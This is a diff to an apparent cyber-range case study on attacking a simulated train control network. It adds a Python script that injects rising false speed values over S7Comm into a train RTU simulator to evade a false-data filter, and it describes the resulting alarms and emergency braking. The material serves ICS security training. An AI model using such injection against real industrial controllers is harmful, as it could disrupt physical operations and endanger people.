@@ -270,7 +270,7 @@ But as attacker, it is hard to identify what's the data's meaning, he select a s
 
 Based on the leaked secret message and the data change frequency the attack try to decode the below type of message as shown below:
 
-```
+```yaml
 S7 Communication
     Header: (Ack_Data)
         Protocol Id: 0x32
@@ -305,7 +305,75 @@ For example in the Packet Example, data `0000006402ec0096`
 
 **4.2.3 Create False Train Speed Data And Inject to Antenna**
 
-As shown in the network topology, the radio antenna simulator VM's IP address is 10.10.10.21, now the attacker make a attack script to keep sending high frequency false data to the radio antenna simulator VM to overwrite the correct data. Based on the packet 01 shown in the previous section, he find that the train Index is mapping to the same data block index of the RTU. So he can build a S7Comm message sending program . 
+As shown in the network topology, the radio antenna simulator VM's IP address is 10.10.10.21, now the attacker make a attack script to keep sending high frequency false data to the radio antenna simulator VM to overwrite the correct data. Based on the packet 01 shown in the previous section, he find that the train Index is mapping to the same data block index of the RTU. Then he find that he is able to attack the train ID = 00005 based on the 
 
-He I use the S7Comm communication lib develop in the RTU simulator project https://github.com/LiuYuancheng/PLC_and_RTU_Simulator/tree/main/S7Comm_RTU_Simulator to build the attack script: 
+![](Case0_img/s_11.png)
 
+So he can build a S7Comm message sending program . He I use the S7Comm communication lib develop in the RTU simulator project https://github.com/LiuYuancheng/PLC_and_RTU_Simulator/tree/main/S7Comm_RTU_Simulator to build the attack script as shown below: 
+
+```python
+import os
+import time
+print("Current working directory is : %s" % os.getcwd())
+DIR_PATH = dirpath = os.path.dirname(os.path.abspath(__file__))
+print("Current source code location : [%s]" % dirpath)
+#-----------------------------------------------------------------------------
+print("Test import S7Comm lib: ")
+try:
+    import snap7Comm
+    from snap7Comm import BOOL_TYPE, INT_TYPE, REAL_TYPE
+except ImportError as err:
+    print("Import error: %s" % str(err))
+    exit()
+print("- pass")
+#-----------------------------------------------------------------------------
+# Import dll file for windows platform.
+libpath = os.path.join(dirpath, 'snap7.dll')
+print("Import snap7 dll path: %s" % str(libpath))
+if os.path.exists(libpath):
+    print("- pass")
+else:
+    print("Error: not file the dll file.")
+    exit()
+#-----------------------------------------------------------------------------
+# Test cases:
+RTU_ANTENNA_IP= '10.10.10.22' # change this IP to the Power grid RTU02 IP address
+RADIO_FREQUEnCY = 102 # use the opened port as the radio frequency.
+client = snap7Comm.s7CommClient(RTU_ANTENNA_IP, rtuPort=RADIO_FREQUEnCY, snapLibPath=libpath)
+connection = client.checkConn()
+initSpeed = 75
+trainIdx = 5
+if connection:
+    for i in range(50):
+        initSpeed += 10 # increase speed to avoid the false data filter activate.
+        print("Attack: Start inject out of range speed value = %s km to the train RTU " %str(initSpeed))
+        client.setAddressVal(trainIdx, 2, initSpeed, dataType=INT_TYPE)
+        time.sleep(0.2)
+        print("Inject Done !")
+```
+
+
+
+**4.2.4 Inject Spoofing Signal and Transfer False Data to OCC**
+
+Now the attack fixed the attack program and the target train 00005 , now he need to bring the attack the attack radio device near one of the antenna and wait the train_00005 pass the antenna, the train will "register" to the antenna when it do the 1st connection then it can start to transmit the data. So the attacker need to wait until the train active the antenna. Now when the train 00005 passed the antenna, he run the high frequency false data injection attack script at the same time. 
+
+Then in the train OCC when the attack happening the speed gauge's needle will be stuck at the red zoom as shown below: 
+
+![](Case0_img/s_12.gif)
+
+In OCC HMI display, the speed keep increasing until 200 km/h. The train ID = 00005 is ns-00 train on the map, at the physical world simulator, the train operate normal as shown below: 
+
+![](Case0_img/s_13.png)
+
+
+
+**4.2.5 Trigger Alarm Mechanisms and Train Emergency Stop Activated**
+
+When the train speed reached max limitation and last for 15 sec, the HMI will pop-up an alarm as shown below 
+
+
+
+
+
+At the same time it starts to remote brake signal to the train 00005 to decrease the train speed, as the attacker keep injecting the false data, the control Alarm Mechanisms decide that the train got some problem as the brake not work. 
